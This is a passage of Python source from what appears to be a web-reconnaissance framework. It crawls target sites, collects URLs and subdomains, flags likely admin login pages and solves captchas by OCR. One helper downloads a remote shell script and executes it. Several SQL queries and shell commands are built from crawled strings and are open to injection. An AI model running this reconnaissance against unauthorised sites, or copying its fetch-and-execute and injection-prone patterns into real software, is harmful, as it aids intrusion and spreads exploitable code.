        if url[-1] == '/':
            y1 = url
            y2 = url[:-1]
        else:
            y1 = url + '/'
            y2 = url
    else:
        # url不是http_domain
        parsed = urllib.parse.urlparse(url)
        y1 = parsed.scheme + '://' + parsed.netloc + parsed.path
        y2_len = len(y1) - len(y1.split('/')[-1]) - 1
        y2 = y1[:y2_len]
    return {
        'y1': y1,
        'y2': y2}


def collect_urls_from_url(url):
    import requests
    import chardet
    return_value={}
    rsp=requests.get(url)
    code=rsp.status_code
    content=rsp.content
    bytesEncoding = chardet.detect(content)['encoding']
    content = content.decode(encoding=bytesEncoding, errors="ignore")
    has_title=re.search(r"<title>([\s\S]*)</title>",content,re.I)
    if has_title:
        title=has_title[1]
    else:
        title=""
    return_value['y1']=collect_urls_from_html(content,url)
    return_value['y2']={'code':code,'title':title,'content':content}
    return return_value

def collect_urls_from_html(content,url):
    from urllib.parse import urljoin
    import html
    all_uris = []
    return_all_urls = []
    cookie = ""
    if os.path.exists(CONFIG_INI_PATH):
        from urllib.parse import urlparse
        cookie = get_url_cookie(url)

    a = re.search(r'''(<form\s+.+>)''',content,re.I)
    if a:
        if "action=" in a.group(1):
            pureActionValue=re.search(r'''action=('|")?([^\s'"<>]+)('|")?''',a.group(1),re.I).group(2)
        else:
            # eg.url=http://192.168.93.139/dvwa/vulnerabilities/xss_s/
            pureActionValue=url.split("?")[0]
        pureActionValue=urljoin(url,pureActionValue)
        
        if re.search(r'''\smethod\s*=\s*('|")?POST('|")?''',a.group(1),re.I):
            #post表单
            formActionValue=pureActionValue+"^"+get_param_part_from_content(content)
        
        else:
            #get表单
            if "?" not in pureActionValue:
                formActionValue=pureActionValue+"?"+get_param_part_from_content(content)
            else:
                param_part=get_param_part_from_content(content)
                content_param_list=get_param_list_from_param_part(param_part)
                url_param_list=get_param_list_from_param_part(url[url.find("?")+1:])
                new_param_part=""
                for each_param in content_param_list:
                    if each_param not in url_param_list:
                        each_param_value=re.search(r"%s(\=[^&]*)" % each_param).group(1)
                        new_param_part+=(each_param+each_param_value+"&")
                if new_param_part!="":
                    new_param_part=new_param_part[:-1]
                    formActionValue=pureActionValue+"&"+new_param_part
                else:
                    formActionValue=pureActionValue

        all_uris.append(formActionValue)

    bs = BeautifulSoup(content, 'lxml')
    if re.match(
        r"%s/*((robots\.txt)|(sitemap\.xml))" %
        get_http_domain_pattern_from_url(url),
            url):
        if re.search(r"(robots\.txt)$", url):
            # 查找allow和disallow中的所有uri
            find_uri_pattern = re.compile(
                r"((Allow)|(Disallow)):[^\S\n]*(/[^?\*\n#]+)(/\?)?\s", re.I)
            find_uri = re.findall(find_uri_pattern, content)
            if find_uri:
                for each in find_uri:
                    all_uris.append(each[3])
            # 查找robots.txt中可能存在的sitemap链接
            find_sitemap_link_pattern = re.compile(
                r"Sitemap:[^\S\n]*(http[\S]*)\s", re.I)
            find_sitemap_link = re.findall(find_sitemap_link_pattern, content)
            if find_sitemap_link:
                for each in find_sitemap_link:
                    all_uris.append(each)

        if re.search(r"(sitemap\.xml)$", url):
            find_url_pattern = re.compile(
                r'''(http(s)?://[^\s'"#<>]+).*\s''', re.I)
            find_url = re.findall(find_url_pattern, content)
            if find_url:
                for each in find_url:
                    all_uris.append(each[0])

    else:
        for each in bs.find_all('a'):
            # 收集a标签(bs可以收集到不带http_domain的a标签)
            find_uri = each.get('href')
            if find_uri is not None:
                if re.match(r"^javascript:", find_uri):
                    continue
                else:
                    find_url=urljoin(url,find_uri)
                    all_uris.append(find_url)
        # 收集src="http:..."中的uri
        for each in bs.find_all(src=True):
            find_uri = each.get('src')
            if find_uri is not None:
                find_url=urljoin(url,find_uri)
                all_uris.append(find_url)


    # 整理uri,将不带http_domain的链接加上http_domain,并将多余的/去除
    for each in all_uris:
        if each not in [None,"http://","https://"]:
            if not re.match(r"^http", each):
                if each[:2] == "//":
                    each = url.split(":")[0] + ":" + each
                else:
                    each = get_value_from_url(url)['y2'] + '/' + each
            # 将多余的/去除
            httpPrefix = each.split(":")[0] + "://"
            nothttpPrefix = each[len(httpPrefix):]
            nothttpPrefix = re.sub(r"/+", "/", nothttpPrefix)
            each = httpPrefix + nothttpPrefix
            each = html.unescape(each)
            if each not in return_all_urls:
                return_all_urls.append(each)
    # 暂时不考虑将如http://www.baidu.com/1.php?a=1&b=2整理成http://www.baidu.com/1.php

    # 整理所有url,将其中带有单引号和双引号和+号的url过滤掉
    final_return_urls = []
    for each in return_all_urls:
        if "'" in each or '"' in each or "{" in each or "(" in each or "[" in each or each[-3:] == ".js" or ".js?" in each or each[-4:] == ".css" or ".css?" in each or '\\' in each:
            pass
        else:
            final_return_urls.append(each)
    return final_return_urls
    #return {'y1': final_return_urls, 'y2': result}


def like_admin_login_content(html):
    # 根据html内容判断页面是否可能是管理员登录页面
    user_pass_form = get_user_and_pass_form_from_html(html)
    user_form_name = user_pass_form['user_form_name']
    pass_form_name = user_pass_form['pass_form_name']
    if user_form_name is not None and pass_form_name is not None:
        return True
    else:
        return False


def like_admin_login_url(url):
    # 判断url对应的html内容是否可能是管理员登录页面
    html = get_request(url, by="seleniumPhantomJS")['content']
    return like_admin_login_content(html)


class MyThread(threading.Thread):

    def __init__(self, func, args, name=''):
        threading.Thread.__init__(self)
        self.name = name
        self.func = func
        self.args = args

    def run(self):
        self.result = self.func(*self.args)

    def get_result():
        return self.result


def get_domain_key_value_from_url(url):
    # 从url中得到域名的关键值
    # eg.从http://www.baidu.com中得到baidu
    url = re.sub(r"(\s)$", "", url)
    http_domain = get_http_domain_from_url(url)
    domain = http_domain.split("//")[-1]
    num = len(domain.split("."))
    if num == 2:
        return domain.split(".")[0]
    if num > 2:
        if domain.split(".")[1] not in [
            'com',
            'cn',
            'org',
            'gov',
            'net',
            'edu',
            'biz',
            'info',
            'me',
            'uk',
            'hk',
            'tw',
            'us',
            'it',
            'in',
            'fr',
            'de',
            'co',
            'cc',
            'cm',
            'pro',
            'br',
                'tv']:
            return domain.split(".")[1]
        else:
            return domain.split(".")[0]


def post_html_handler(html):
    # 处理爬虫遇到包含post数据的html(url)的情况
    if not re.search(r'''type=('|")?submit('|")?''', html.re.I):
        return


def url_is_sub_domain_to_http_domain(url,http_domain):
    main_domain_prefix = re.search(
        r"http(s)?://([^\.]*)\.([^\./]*)",
        http_domain).group(2)
    main_domain_key_value = re.search(
        r"http(s)?://([^\.]*)\.([^\./]*)", http_domain).group(3)
    if re.match(
        r"http(s)?://[^\.]*(?<!%s)\.%s" %
        (main_domain_prefix,
         main_domain_key_value),
            url) and get_domain_key_value_from_url(url) == get_domain_key_value_from_url(http_domain):
        return True
    return False

def scrapy_splash_crawl_url(url):
    # replace crawl_url method
    url=re.sub(r"\s+$","",url)
    spider_file=ModulePath+"/crawler/crawler/spiders/exp10it_spider.py"
    parsed=urlparse(url)
    if re.search(r"/\S+\.\S{1,4}$",parsed.path):
        path=re.sub(r"(?<=/)[^/\s\.]+\.\S{1,4}","",parsed.path)
    else:
        if parsed.path=="" or parsed.path[-1]!="/":
            path=parsed.path+"/"
    modify_url=parsed.scheme+"://"+parsed.netloc+path
    cmd='''sed -i 's#target_url_to_crawl=".*"#target_url_to_crawl="%s"#g' %s''' % (modify_url,spider_file)
    os.system(cmd)
    cmd="cd %s && python3 -m scrapy crawl exp10it" % (ModulePath+"/crawler/crawler")
    os.system(cmd)

def crawl_url(url):
    global DB_NAME
    # 爬虫,可获取url对应网站的所有可抓取的url和所有网页三元素:code,title,content
    import re

    figlet2file("crawling url", 0, True)
    print(url)

    from colorama import init, Fore
    init(autoreset=True)
    print(Fore.BLUE + url)

    url_belong_to_main_target = [False]
    # url属于哪个主目标(非旁站子站的那个目标)
    # 如http://wit.freebuf.com得到www.freebuf.com
    url_main_target = [get_url_belong_main_target_domain(url)]
    # eg.www_freebuf_com_pang
    url_main_target_pang_table_name = url_main_target[
        0].replace(".", "_") + "_pang"
    # eg.www_freebuf_com_sub
    url_main_target_sub_table_name = url_main_target[
        0].replace(".", "_") + "_sub"
    current_not_main_target_table_name = []
    if url_main_target[0] == get_http_domain_from_url(url).split('/')[-1]:
        # 说明该url是目标url，不是目标的某个旁站或子站url
        table_name = [
            get_main_target_table_name(
                get_http_domain_from_url(url))]
        url_belong_to_main_target = [True]
    else:
        pang_table_exists = False
        sub_table_exists = False
        if exist_table_in_db(url_main_target_pang_table_name,DB_NAME):
            pang_table_exists = True
            result1 = execute_sql_in_db(
                "select * from `%s` where http_domain='%s'" %
                (url_main_target_pang_table_name,
                 get_http_domain_from_url(url)),DB_NAME)
            if len(result1) > 0:
                current_not_main_target_table_name.append(
                    url_main_target_pang_table_name)
        if exist_table_in_db(url_main_target_sub_table_name,DB_NAME):
            sub_table_exists = True
            result2 = execute_sql_in_db(
                "select * from `%s` where http_domain='%s'" %
                (url_main_target_sub_table_name,
                 get_http_domain_from_url(url)),DB_NAME)
            if len(result2) > 0:
                current_not_main_target_table_name.append(
                    url_main_target_sub_table_name)
            # 有种情况下,非主要目标的url存储信息的表在主要目标的旁站表和子站表中都存在,
            # 也即该url既是旁站url又是子站url,eg.wit.freebuf.com既是旁站又是子站

    urls_queue = queue.Queue()
    urls_url_keyvalues = {}
    # url和url的三个元素的对应值为一个字典的键值对
    # eg{'http://www.baiud.com':{'code':code,'title':title,'content':content},"":{},"":{},...}
    # 用于收集url与对应的三个元素的值,收集后考虑可能统一存入数据库

    # 收集相同域名网站内的urls
    domain_urls = []
    resource_files = []
    # 收集二级域名
    subdomain_urls = []

    def task_finish_func():
        while True:
            current_url = urls_queue.get()
            print(current_url)
            http_domain = get_http_domain_from_url(current_url)
            # eg.main_domain_prefix从http://www.freebuf.com中得到www
            # main_domain_key_value从http://www.freebuf.com中得到freebuf
            main_domain_prefix = re.search(
                r"http(s)?://([^\.]*)\.([^\./]*)",
                current_url).group(2)
            main_domain_key_value = re.search(
                r"http(s)?://([^\.]*)\.([^\./]*)", current_url).group(3)

            if re.search(r"(logout)|(logoff)|(exit)|(signout)|(signoff)", current_url, re.I):
                print("current url is:%s,I will not crawl this url" %
                      current_url)
                continue
            else:
                pass
            result = collect_urls_from_url(current_url)
            code = result['y2']['code']
            title = result['y2']['title']
            content = result['y2']['content']
            if content is None:
                print("exist None value of content")
                continue
            # eg:www.baidu.com_urls or www.baidupangzhan.com_urls
            target_or_pang_or_sub_urls_table_name = get_http_domain_from_url(
                current_url).split('/')[-1].replace(".", "_") + "_urls"
            '''
            # 取消targets和first_targets表中的各个如urls,dirb,cms_value等列,将详细信息存在如www_freebuf_com_pang
            # 表中,targets或first_targets表中只存放主目标(也即非旁站目标)包括该主目标的所有旁站的扫描完成情况
            if url_belong_to_main_target[0]==True:
                # 得到的url要存放到urls列,eg.在targets表和www_freebuf_com_pang表中都有
                # http_domain='http://www.freebuf.com'对应的urls列,这样要在两个表中的urls都填上此处的url
                # www.freebuf.com的旁站eg.http://bar.freebuf.com只要在www_freebuf_com_pang表中的urls列中填写此处
                # 的url,targets表或first_targets表中没有旁站bar.freebuf.com对应的项目
                auto_write_string_to_sql(current_url,eval(get_key_value_from_config_file(CONFIG_INI_PATH,'default','db_name')),table_name[0],"urls","http_domain",http_domain)
            '''
            # 下面将当前url写入如www_freebuf_com_pang或www_freebuf_com_sub表的urls列中
            if url_belong_to_main_target[0]:
                auto_write_string_to_sql(current_url, DB_NAME, table_name[0], "urls", "http_domain", http_domain)

                if like_admin_login_content(content):
                    auto_write_string_to_sql(
                        current_url,
                        DB_NAME,
                        table_name[0],
                        "like_admin_login_urls",
                        "http_domain",
                        http_domain)
                    execute_sql_in_db(
                        "update `%s` set like_admin_login_url='1' where url='%s'" %
                        (target_or_pang_or_sub_urls_table_name, current_url),DB_NAME) 
                else:
                    execute_sql_in_db(
                        "update `%s` set like_admin_login_url='0' where url='%s'" %
                        (target_or_pang_or_sub_urls_table_name, current_url),DB_NAME) 

            else:
                # 当前url不是直接主要目标domain的url,如http://wit.freebuf.com/1.php
                for each in current_not_main_target_table_name:
                    # 如果current_not_main_target_table_name列表中只有一个(url是旁站或子站)
                    # 如果....2个(url是旁站又是子站)
                    auto_write_string_to_sql(
                        current_url,
                        DB_NAME,
                        each,
                        "urls",
                        "http_domain",
                        http_domain)

                    if like_admin_login_content(content):
                        auto_write_string_to_sql(
                            current_url,
                            DB_NAME,
                            each,
                            "like_admin_login_urls",
                            "http_domain",
                            http_domain)
                        execute_sql_in_db(
                            "update `%s` set like_admin_login_url='1' where url='%s'" %
                            (target_or_pang_or_sub_urls_table_name, current_url),DB_NAME) 
                    else:
                        execute_sql_in_db(
                            "update `%s` set like_admin_login_url='0' where url='%s'" %
                            (target_or_pang_or_sub_urls_table_name, current_url),DB_NAME) 

            auto_write_string_to_sql(
                str(code),
                DB_NAME,
                target_or_pang_or_sub_urls_table_name,
                "code",
                "url",
                current_url)
            auto_write_string_to_sql(
                title,
                DB_NAME,
                target_or_pang_or_sub_urls_table_name,
                "title",
                "url",
                current_url)
            auto_write_string_to_sql(
                content,
                DB_NAME,
                target_or_pang_or_sub_urls_table_name,
                "content",
                "url",
                current_url)

            urls = result['y1']
            for each in urls:
                # collect_urls_from_url得到的结果中的元素可能是None
                if each is not None:
                    tmp = get_http_domain_pattern_from_url(http_domain)
                    http_domain_pattern = re.compile(r"%s" % tmp)
                    if re.match(http_domain_pattern, each):
                        each = re.sub(r"/$", "", each)

                        if re.match(RESOURCE_FILE_PATTERN, each):
                            if each not in resource_files:
                                # 资源类型文件不放入任务队列里,直接写到数据库中
                                resource_files.append(each)
                                if url_belong_to_main_target[0]:
                                    auto_write_string_to_sql(
                                        each,
                                        DB_NAME,
                                        table_name[0],
                                        "resource_files",
                                        "http_domain",
                                        http_domain)

                                else:
                                    for each_table in current_not_main_target_table_name:
                                        auto_write_string_to_sql(
                                            each, DB_NAME, each_table, "resource_files", "http_domain", http_domain)
                        else:
                            if each not in domain_urls:
                                # print each
                                domain_urls.append(each)
                                # print domain_urls
                                urls_queue.put(each)
                    if re.match(
                        r"http(s)?://[^\.]*(?<!%s)\.%s" %
                        (main_domain_prefix,
                         main_domain_key_value),
                            each) and get_domain_key_value_from_url(each) == get_domain_key_value_from_url(current_url):
                        each_subdomain = get_http_domain_from_url(each)
                        if each_subdomain not in subdomain_urls:
                            # 二级域名只将http_domain部分写入targets或first_targets表中
                            # 此处暂存于列表中,最后统一存入数据库和本地文件中
                            subdomain_urls.append(each_subdomain)
            # 将所有结果存一份在字典中，暂时没有什么用
            urls_url_keyvalues['%s' % url] = result['y2']
            urls_queue.task_done()

    # 初始化
    url = re.sub(r"(/{0,2}(\s){0,2})$", "", url)
    http_domain = get_http_domain_from_url(url)
    start_urls = [url]
    if url != http_domain:
        start_urls.append(http_domain)

    robots_txt_url = http_domain + "/robots.txt"
    result = get_request(robots_txt_url, by="MechanicalSoup")
    if result['code'] == 200 and len(result['content']) > 0:
        start_urls.append(robots_txt_url)
        content = result['content']
        strings_to_write = "robots.txt exists,content is:\r\n" + content
        if url_belong_to_main_target[0]:
            # 如果是主目标url
            auto_write_string_to_sql(
                strings_to_write,
                DB_NAME,
                table_name[0],
                "robots_and_sitemap",
                "http_domain",
                http_domain)
        else:
            # 如果不是主目标url
            for each in current_not_main_target_table_name:
                auto_write_string_to_sql(
                    strings_to_write,
                    DB_NAME,
                    each,
                    "robots_and_sitemap",
                    "http_domain",
                    http_domain)

    sitemap_xml_url = http_domain + "/sitemap.xml"
    result = get_request(sitemap_xml_url, by="MechanicalSoup")
    if result['code'] == 200 and len(result['content']) > 0:
        start_urls.append(sitemap_xml_url)
        content = result['content']
        strings_to_write = "sitemap.xml exists,content is:\r\n" + content
        if url_belong_to_main_target[0]:
            auto_write_string_to_sql(
                strings_to_write,
                DB_NAME,
                table_name[0],
                "robots_and_sitemap",
                "http_domain",
                http_domain)
        else:
            for each in current_not_main_target_table_name:
                auto_write_string_to_sql(
                    strings_to_write,
                    DB_NAME,
                    each,
                    "robots_and_sitemap",
                    "http_domain",
                    http_domain)

    for each in start_urls:
        print(each)
        domain_urls.append(each)
        urls_queue.put(each)

    '''传统多线程
    mythreads=[]
    start=time.time()
    for i in range(15):
        mythread=MyThread(task_finish_func,())
        mythreads.append(mythread)
    for i in range(15):
        mythreads[i].setDaemon(True)
        mythreads[i].start()
        print("%s threads started" % str(i))
    urls_queue.join()
    end=time.time()
    print(end-start)
    print(len(domain_urls))
    # upon threads=200 ===> 38,16
    # threads=5 ===> 12,16
    # threads=10 4,16
    # threads=15 3.4,16
    '''

    '''单线程
    start=time.time()
    task_finish_func()
    urls_queue.join()
    end=time.time()
    print(end-start)
    print(len(domain_urls))
    # thread=1 task_finish_func中while True改成while urls_queue.empty() is False,要不然不会执行到最后   19.4,16
    '''

    mythreads = []
    start = time.time()
    pool = ThreadPool(15)
    for i in range(15):
        # 这里比较特殊,因为函数task_finish_func是个无限循环的函数,所以就算这里开20个线程也会因为线程池中只有15\
        # 个位置使得一直只有15个线程在运行,多余的5个线程相当于没有设置一样
        pool.apply_async(task_finish_func, ())
    pool.close()

    while 1:
        # 这里的if取代下面的urls_queue.join(),有时爬虫被ban时,如果用urls_queue.join()会无限等待
        num_of_result = len(domain_urls)
        # 实验中15s是较好的数据
        sleep(15)
        if len(domain_urls) == num_of_result:
            print(
                Fore.BLUE +
                "finished,if the number of urls you get is not big enough,you may be banned to crawl :(")
            break
    # urls_queue.join()
    end = time.time()
    print(end - start)
    print(len(domain_urls))
    # auto_write_string_to_sql("1",eval(get_key_value_from_config_file(CONFIG_INI_PATH,'default','DB_NAME')),target_urls_table_name)
    # threads=15(pool_size=15,for_range=20) 4.15,16
    # threads=20(pool_size=20,for_range=20) 9.2,16
    # threads=10(pool_size=10,for_range=20) 4.2,16

    # 处理子站,将爬虫爬到的子站存入数据库和本地文件中,但是爬虫爬到的子站不再爬,因为事先有专门的子站获取模块,如
    # 果此处的自己的爬虫模块在爬到新的子站也新建urls表并爬虫,则有可能爬很久,况且事先的专门的子站获取模块应该可
    # 以得到所有的子站,这里的自己的爬虫模块便不再爬新的子站了,也不建立新的子站urls表,只作收录,
    # 不直接爬这个新的子站,以后如果有需求再爬

    sql = "select http_domain from `%s`" % url_main_target_sub_table_name
    result = execute_sql_in_db(sql,DB_NAME) 
    sub_domain_list = []
    if len(result) > 0:
        for http_domain_in_db in result:
            sub_domain_list.append(http_domain_in_db[0])
    else:
        print("%s error" % sql)

    for each in subdomain_urls:
        # subdomain_urls中存放的是http+domain格式的列表
        if url_belong_to_main_target[0]:
            # 此时当前爬虫目标是主要目标
            if each not in sub_domain_list:

                # 将新的子站存入本地文件
                if not os.path.exists(LOG_FOLDER_PATH):
                    os.system("mkdir %s" % LOG_FOLDER_PATH)
                if not os.path.exists("%s/sub" % LOG_FOLDER_PATH):
                    os.system("cd %s && mkdir sub" % LOG_FOLDER_PATH)

                os.system(
                    "echo %s >> %s" %
                    (each.split("/")[-1], LOG_FOLDER_PATH + "/sub/" + url_main_target_sub_table_name + ".txt"))

                if each != url_main_target[0]:
                    # 如果不为主要目标则存入数据库
                    auto_write_string_to_sql(
                        each.split("/")[-1],
                        DB_NAME,
                        table_name[0],
                        "sub_domains",
                        "http_domain",
                        get_http_domain_from_url(url))
                    sql = "insert ignore into `%s`(http_domain,domain) values('%s','%s')" % (
                        url_main_target_sub_table_name, each, each.split("/")[-1])
                    execute_sql_in_db(sql,DB_NAME) 
        else:
            # 只有当前爬虫的目标是属于主要目标才将子站存入数据库和本地文件,旁站和子站目标如wit.freebuf.com在
            # crawl_url函数中不爬,在crawl_scan中会根据SCAN_WAY来采取不同爬虫方法
            pass


def crawl_scan(start_url):
    # target是主要目标
    # 对target目标的爬虫扫描,称为爬虫扫描而不是爬虫是因为这里不只是对一个eg.http://www.freebuf.com的扫描
    # 而是根据SCAN_WAY来对目标以及目标的旁站或子站的爬虫
    # target要求是http格式

    global DB_NAME
    global SCAN_WAY
    global DELAY

    target=get_http_domain_from_url(start_url)

    main_target_table_name = get_main_target_table_name(target)

    http_domain_sqli_scaned = get_scan_finished(
        "crawl_scaned",
        DB_NAME,
        main_target_table_name,
        'start_url',
        start_url)
    pang_domains_crawl_scaned = get_scan_finished(
        "pang_domains_crawl_scaned",
        DB_NAME,
        main_target_table_name,
        'start_url',
        start_url)
    sub_domains_crawl_scaned = get_scan_finished(
        "sub_domains_crawl_scaned",
        DB_NAME,
        main_target_table_name,
        'start_url',
        start_url)
    if http_domain_sqli_scaned == 0:
        scrapy_splash_crawl_url(start_url)
        set_scan_finished(
            "crawl_scaned",
            DB_NAME,
            main_target_table_name,
            'start_url',
            start_url)
    elif http_domain_sqli_scaned == 1:
        print("main target crawl_scaned")
        pass
    else:
        print("get_scan_finished error in crawl_scan func")
    if SCAN_WAY == 1:
        if pang_domains_crawl_scaned == 1:
            return
        # 从数据库中获取target的旁站列表
        sql = "select http_domain from `%s`" % (
            target.split("/")[-1].replace(".", "_") + "_pang")
        result = execute_sql_in_db(sql,DB_NAME) 
        if len(result) > 0:
            for each in result:
                if each[0] != "":
                    crawl_scaned = get_scan_finished("crawl_scaned", DB_NAME, target.split("/")[-1].replace(".", "_") + "_pang","http_domain", each[0])
                    if crawl_scaned == 0:
                        scrapy_splash_crawl_url(each[0])
                        set_scan_finished("crawl_scaned", DB_NAME, target.split("/")[-1].replace(".", "_") + "_pang","http_domain", each[0])
                else:
                    print("crawl_scan func's each[0] error in SCAN_WAY 1")
            set_scan_finished("pang_domains_crawl_scaned", DB_NAME,main_target_table_name,"start_url", start_url)
        else:
            print("crawl_scan func's %s error" % sql)
    elif SCAN_WAY == 2:
        if sub_domains_crawl_scaned == 1:
            return
        # 从数据库中获取target的子站列表
        sql = "select http_domain from `%s`" % (
            target.split("/")[-1].replace(".", "_") + "_sub")
        result = execute_sql_in_db(sql,DB_NAME) 
        if len(result) > 0:
            for each in result:
                if each[0] != "":
                    crawl_scaned = get_scan_finished("crawl_scaned", DB_NAME, target.split(
                        "/")[-1].replace(".", "_") + "_sub","http_domain", each[0])
                    if crawl_scaned == 0:
                        scrapy_splash_crawl_url(each[0])
                        set_scan_finished("crawl_scaned", DB_NAME, target.split(
                            "/")[-1].replace(".", "_") + "_sub","http_domain", each[0])
                else:
                    print("crawl_scan func's each[0] error in SCAN_WAY 2")
                set_scan_finished("crawl_scaned", DB_NAME, target.split(
                    "/")[-1].replace(".", "_") + "_sub","http_domain", each[0])
            set_scan_finished("sub_domains_crawl_scaned", DB_NAME,main_target_table_name,"start_url", start_url)
        else:
            print("crawl_scan func's %s error" % sql)
    elif SCAN_WAY == 3:
        # 从数据库中获取target的旁站和子站列表,如果旁站中和子站中有相同的http_domain值
        # 也即有某个如wit.freebuf.com的url即是www.freebuf.com的旁站又是它的子站,则只在旁站中爬虫一次相同的
        # domain(wit.freebuf.com),子站中不再重复爬虫同一个domain(wit.freebuf.com)

        # 从数据库中获取target的旁站列表
        if pang_domains_crawl_scaned == 1 and sub_domains_crawl_scaned == 1:
            return
        pang_list = []
        sql = "select http_domain from `%s`" % (
            target.split("/")[-1].replace(".", "_") + "_pang")
        result = execute_sql_in_db(
            sql, eval(get_key_value_from_config_file(CONFIG_INI_PATH, 'default', 'db_name')))
        if len(result) > 0:
            for each in result:
                if each[0] != "":
                    pang_list.append(each[0])
                    crawl_scaned = get_scan_finished("crawl_scaned", DB_NAME, target.split("/")[-1].replace(".", "_") + "_pang","http_domain", each[0])
                    if crawl_scaned == 0:
                        scrapy_splash_crawl_url(each[0])
                        set_scan_finished("crawl_scaned", DB_NAME, target.split(
                            "/")[-1].replace(".", "_") + "_pang","http_domain", each[0])
                else:
                    print("crawl_scan func's each[0] error in SCAN_WAY 3")
            set_scan_finished("pang_domains_crawl_scaned",DB_NAME,main_target_table_name,"start_url",start_url)
        else:
            print("crawl_scan func's %s error" % sql)

        # 从数据库中获取target的子站列表并对没有在旁站中出现的http domain爬虫
        sql = "select http_domain from `%s`" % (
            target.split("/")[-1].replace(".", "_") + "_sub")
        result = execute_sql_in_db(sql,DB_NAME) 
        if len(result) > 0:
            for each in result:
                if each[0] != "" and each[0] not in pang_list:
                    crawl_scaned = get_scan_finished("crawl_scaned", DB_NAME, target.split("/")[-1].replace(".", "_") + "_sub","http_domain", each[0])
                    if crawl_scaned == 0:
                        scrapy_splash_crawl_url(each[0])
                        set_scan_finished("crawl_scaned", DB_NAME, target.split(
                            "/")[-1].replace(".", "_") + "_sub","http_domain", each[0])
                elif each[0] in pang_list:
                    print(
                        "%s is pang domain and sub domain and will not crawl in sub domain table since\
it has crawled in pang domain table" %
                        each[0])
                    set_scan_finished("crawl_scaned", DB_NAME, target.split("/")[-1].replace(".", "_") + "_sub","http_domain", each[0])
                else:
                    print("crawl_scan func's each[0] error in SCAN_WAY 3")
            set_scan_finished("sub_domains_crawl_scaned", DB_NAME,main_target_table_name,"start_url",start_url)
        else:
            print("crawl_scan func's %s error" % sql)

    elif SCAN_WAY == 4:
        pass
    else:
        print("SCAN_WAY error in crawl_scan")


def get_yanzhengma_from_pic(img, cleanup=True, plus=''):
    # 调用系统安装的tesseract来识别验证码
    # cleanup为True则识别完成后删除生成的文本文件
    # plus参数为给tesseract的附加高级参数
    # print get_string_from_yanzhengma('2.jpg')  # 打印识别出的文本,删除txt文件
    # print get_string_from_yanzhengma('2.jpg', False)  # 打印识别出的文本,不删除txt文件
    # print get_string_from_yanzhengma('2.jpg', False, '-l eng')  #
    # 打印识别出的文本,不删除txt文件,同时提供高级参数
    command_output = get_string_from_command("tesseract")
    if re.search(r'tesseract not found', command_output):
        os.system(
            "wget https://raw.githubusercontent.com/3xp10it/mytools/master/install_tesseract.sh")
        os.system("chmod +x install_tesseract.sh")
        os.system("./install_tesseract.sh")
        os.system('tesseract ' + img + ' ' + img + ' ' + plus)  # 生成同名txt文件
    else:
        get_string_from_command(
            'tesseract ' +
            img +
            ' ' +
            img +
            ' ' +
            plus)  # 生成同名txt文件

    with open(img + ".txt", "r+") as f:
        text = f.read()
    text = re.sub(r"\s", "", text)
    if cleanup:
        os.remove(img + '.txt')
    return text


def get_string_from_url_or_picfile(url_or_picfile):
    # 从url或图片文件中得到验证码,不支持jpeg,支持png
    from PIL import Image, ImageEnhance
    # from pytesseract import *
    from urllib.request import urlretrieve

    def get_pic_from_url(url, save_pic_name):
        # 这里不打印wget的执行过程
        get_string_from_command("wget %s -O temp.png" % url)

    if url_or_picfile[:4] == "http":
        get_pic_from_url(url_or_picfile, 'temp.png')
        im = Image.open("temp.png")
    else:
        im = Image.open(url_or_picfile)

    nx, ny = im.size
    im2 = im.resize((int(nx * 5), int(ny * 5)), Image.BICUBIC)
    im2.save("temp2.png")

    # 下面这两句会在电脑上打开temp2.png
    # enh = ImageEnhance.Contrast(im)
    # enh.enhance(1.3).show("30% more contrast")
    string = get_yanzhengma_from_pic("temp2.png")
    get_string_from_command("rm temp.png temp2.png")
    return string


def mail_msg_to(msg, mailto='config', subject='test', user='config', password='config', format='plain'):
    # 使用163的邮箱发送邮件
    # msg是要发送的string
    # mailto是发送的目标邮箱地址
    # subject是主题名
    # user,password是用户名密码,其中user要带上邮箱地址后缀

    if mailto == user == password == 'config':
        if not os.path.exists(CONFIG_INI_PATH):
            os.system("touch %s" % CONFIG_INI_PATH)
        with open(CONFIG_INI_PATH, "r+") as f:
            content = f.read()
        if re.search(r"mailto", content):
            mailto = eval(get_key_value_from_config_file(
                CONFIG_INI_PATH, 'mail', 'mailto'))
        else:
            mailto = input("please input email address you want send to:")
            update_config_file_key_value(
                CONFIG_INI_PATH, 'mail', 'mailto', "'" + mailto + "'")
        if re.search(r"user", content):
            user = eval(get_key_value_from_config_file(
                CONFIG_INI_PATH, 'mail', 'user'))
        else:
            user = input("please input your email account:")
            update_config_file_key_value(
                CONFIG_INI_PATH, 'mail', 'user', "'" + user + "'")
        if re.search(r"password", content):
            password = eval(get_key_value_from_config_file(
                CONFIG_INI_PATH, 'mail', 'password'))
        else:
            password = input("please input your email account password:")
            update_config_file_key_value(
                CONFIG_INI_PATH, 'mail', 'password', "'" + password + "'")
    import smtplib
    from email.mime.text import MIMEText
    from email.header import Header

    host = 'smtp.163.com'
    fromMail = user
    body = msg
    if isinstance(body, str) is True:
        body = str(body)
    me = ("%s<" + fromMail + ">") % (Header('naruto', 'utf-8'),)
    msg = MIMEText(body, format, 'utf-8')
    if not isinstance(subject, str):
        subject = str(subject)
    msg['Subject'] = subject
    msg['From'] = me
    msg['To'] = mailto
    msg["Accept-Language"] = "zh-CN"
    msg["Accept-Charset"] = "ISO-8859-1,utf-8"
    try:
        s = smtplib.SMTP()
        s.connect(host)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.set_debuglevel(3)
        s.login(user, password)
        s.sendmail(me, mailto, msg.as_string())
        s.quit()
        return True
    except Exception as e:
        print(str(e))
        return False


def get_input_intime1(default_choose, timeout=10):
    # http://www.cnblogs.com/jefferybest/archive/2011/10/09/2204050.html
    # 在一定时间内得到选择的值,如果没有选择则返回默认选择
    # 第一个参数为默认选择值
    # 第二个参数为设置超时后自动选择默认值的时间大小,单位为秒
    # 返回选择的值,返回值是选择的值或是默认选择值,选择的值为str类型,默认的选择值可为任意类型

    default_choose = [default_choose]
    timeout = [timeout]
    choosed = [0]
    chioce = ['']

    def print_time_func():
        print("Please input your choice before timeout")
        while choosed[0] == 0 and timeout[0] > 0:
            time.sleep(1)
            sys.stdout.write(
                '\r' + ' ' * (len(readline.get_line_buffer()) + 2) + '\r')
            sys.stdout.write("\r%ss " % timeout[0])
            sys.stdout.write('>>: ' + readline.get_line_buffer())
            sys.stdout.flush()
            timeout[0] -= 1
        if choosed[0] == 0:
            chioce[0] = default_choose[0]

    def input_func():
        while choosed[0] == 0 and timeout[0] > 0:
            s = input('>>: ')
